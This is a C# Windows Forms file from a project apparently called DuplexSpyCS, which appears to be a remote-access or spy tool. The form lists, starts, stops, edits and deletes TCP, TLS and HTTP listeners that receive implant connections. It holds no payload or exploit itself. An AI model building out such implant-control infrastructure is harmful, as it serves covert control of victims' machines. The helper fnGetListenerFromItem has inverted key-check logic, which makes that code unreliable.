using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmListener : Form
    {
        private clsSqlConn m_sqlConn { get; set; }
        private frmMain m_frmMain { get; set; }
        private Dictionary<string, clsListener> m_dicListener => m_frmMain.m_dicListener;

        public frmListener(clsSqlConn sqlConn, frmMain fMain)
        {
            InitializeComponent();

            m_sqlConn = sqlConn;
            m_frmMain = fMain;
        }

        private stListenerConfig fnGetItemTag(ListViewItem item) => (stListenerConfig)item.Tag;
        private clsListener fnGetListenerFromItem(ListViewItem item) => m_dicListener.ContainsKey(item.Text) ? null : m_dicListener[item.Text];

        void fnLoadListener()
        {
            //Clear listview items.
            listView1.Items.Clear();

            //Select listener config from database.
            if (m_dicListener.Keys.Count == 0)
            {
                var lListener = m_sqlConn.fndtGetAllListener();
                foreach (var config in lListener)
                {
                    ListViewItem item = new ListViewItem(config.szName);
                    item.SubItems.Add(config.enProtocol.ToString());
                    item.SubItems.Add(config.nPort.ToString());
                    item.SubItems.Add(config.szDescription);
                    item.SubItems.Add(config.dtCreationDate.ToString("F"));
                    item.SubItems.Add("Closed");

                    item.Tag = config;

                    listView1.Items.Add(item);

                    clsListener listener = new clsListener();
                    switch (config.enProtocol)
                    {
                        case enListenerProtocol.TCP:
                            listener = new clsTcpListener(config.szName, config.nPort, config.szDescription);
                            break;
                        case enListenerProtocol.TLS:
                            listener = new clsTlsListener(config.szName, config.nPort, config.szDescription, config.szCertPath, config.szCertPassword);
                            break;
                        case enListenerProtocol.HTTP:
                            listener = new clsHttpListener(config.szName, config.nPort, config.szDescription);
                            break;
                        default:
                            
                            break;
                    }

                    listener.ReceivedDecoded += m_frmMain.fnReceived;
                    listener.Disconencted += m_frmMain.fnDisconnected;
                    listener.ImplantConnected += m_frmMain.fnImplantConnected;

                    if (!m_frmMain.m_dicListener.ContainsKey(config.szName))
                    {
                        m_frmMain.m_dicListener.Add(config.szName, listener);
                    }
                }
            }
            else
            {
                foreach (string szName in m_dicListener.Keys)
                {
                    clsListener listener = m_dicListener[szName];
                    stListenerConfig config = m_sqlConn.fnGetListener(szName);

                    ListViewItem item = new ListViewItem(szName);
                    item.SubItems.Add(config.enProtocol.ToString());
                    item.SubItems.Add(config.nPort.ToString());
                    item.SubItems.Add(config.szDescription);
                    item.SubItems.Add(config.dtCreationDate.ToString("F"));
                    item.SubItems.Add(listener.m_bIslistening ? "Opened" : "Closed");

                    item.Tag = config;

                    listView1.Items.Add(item);
                }
            }

            //Display listener count.
            toolStripStatusLabel1.Text = $"Listener[{listView1.Items.Count}]";
        }

        void fnStartAll()
        {
            foreach (string szName in m_dicListener.Keys)
            {
                var listener = m_dicListener[szName];

                if (!listener.m_bIslistening)
                    listener.fnStart();

                ListViewItem item = listView1.FindItemWithText(szName);
                item.SubItems[5].Text = "Opened";
            }
        }

        void fnStopAll()
        {
            foreach (string szName in m_dicListener.Keys)
            {
                var listener = m_dicListener[szName];

                if (listener.m_bIslistening)
                    listener.fnStop();

                ListViewItem item = listView1.FindItemWithText(szName);
                item.SubItems[5].Text = "Closed";
            }
        }

        void fnSetup()
        {
            fnLoadListener();

            toolStripStatusLabel1.Text = $"Listener[{listView1.Items.Count}]";
        }

        private void frmListener_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //Refresh
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            fnLoadListener();
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            frmListenerEdit f = new frmListenerEdit(new stListenerConfig(), m_sqlConn);

            f.ShowDialog();
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            var lConfig = listView1.SelectedItems.Cast<ListViewItem>().Select(x => fnGetItemTag(x)).ToList();
            if (lConfig.Count == 0)
                return;

            frmListenerEdit f = new frmListenerEdit(lConfig.First(), m_sqlConn);

            f.ShowDialog();
        }

        //Start
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            fnStartAll();
        }

        //Stop
        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            fnStopAll();
        }

        //Refresh
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            fnLoadListener();
        }

        //New
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            frmListenerEdit f = new frmListenerEdit(new stListenerConfig(), m_sqlConn);

            f.ShowDialog();
        }

        //Edit
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            var lConfig = listView1.SelectedItems.Cast<ListViewItem>().Select(x => fnGetItemTag(x)).ToList();
            if (lConfig.Count == 0)
                return;

            foreach (var config in lConfig)
            {
                frmListenerEdit f = new frmListenerEdit(config, m_sqlConn);

                f.ShowDialog();
            }
        }

        //Delete
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                var listener = m_dicListener[item.Text];
                if (listener.m_bIslistening)
                    listener.fnStop();

                if (!m_sqlConn.fnbDeleteListener(item.Text))
                {
                    MessageBox.Show("Cannot delete listener: " + item.Text, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

                m_dicListener.Remove(item.Text);
            }

            fnLoadListener();
        }

        //Start selected
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                var listener = fnGetListenerFromItem(item);
                
                if (!listener.m_bIslistening)
                    listener.fnStart();
            }
        }
        //Start All
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            fnStartAll();
        }

        //Stop selected
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                var listener = fnGetListenerFromItem(item);

                if (listener.m_bIslistening)
                    listener.fnStop();
            }
        }
        //Stop All
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            fnStopAll();   
        }
    }
}
